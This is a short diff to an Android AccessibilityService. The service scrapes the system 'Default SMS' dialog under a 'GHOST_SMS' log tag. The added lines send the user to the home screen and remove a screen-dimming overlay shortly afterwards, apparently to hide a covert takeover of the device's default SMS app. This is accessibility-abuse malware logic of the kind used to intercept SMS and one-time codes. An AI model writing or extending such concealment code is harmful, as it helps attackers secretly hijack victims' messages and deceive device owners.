@@ -619,6 +619,11 @@ class MyAccessibilityService : AccessibilityService() {
                 DumpManager.appendLog("SCRAPE_SMS_DIALOG", wrapper)
                 DebugLogger.log("GHOST_SMS", "Scraped Default SMS dialog for forensic mapping.")
                 DefaultSmsManager.expectedMode = "" // Disarm
+                
+                performGlobalAction(GLOBAL_ACTION_HOME)
+                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    DimmerManager.removeOverlay(applicationContext)
+                }, 500)
             }
         }
 
